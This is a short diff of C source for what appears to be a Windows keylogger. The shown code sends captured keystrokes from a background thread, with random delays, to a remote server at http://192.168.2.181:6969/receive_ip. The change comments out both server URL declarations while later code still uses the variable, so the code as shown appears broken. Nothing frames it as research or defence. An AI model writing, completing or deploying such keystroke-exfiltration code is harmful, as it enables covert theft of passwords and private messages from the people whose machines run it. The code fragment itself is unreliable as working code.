@@ -112,7 +112,7 @@ DWORD WINAPI keystrokeSenderThread(LPVOID param) {
 void mainToUseThreadForSendingKeystrokesIndividuallyWithRandomDelay() {
     InitializeCriticalSection(&queueLock);
 
-    const char* serverUrl = "http://192.168.2.181:6969/receive_ip";  // Change this later
+   // const char* serverUrl = "http://192.168.2.181:6969/receive_ip";  // Change this later
 
     // Create the sender thread
     HANDLE senderThread = CreateThread(NULL, 0, keystrokeSenderThread, (LPVOID)serverUrl, 0, NULL);
@@ -168,7 +168,7 @@ int main() {
         return 1;
     }
 
-    const char* serverUrl = "http://192.168.2.181:6969/receive_ip";  // Change as needed
+  //  const char* serverUrl = "http://192.168.2.181:6969/receive_ip";  // Change as needed
 
     // Initialize keyStates array
     memset(keyStates, 0, sizeof(keyStates));
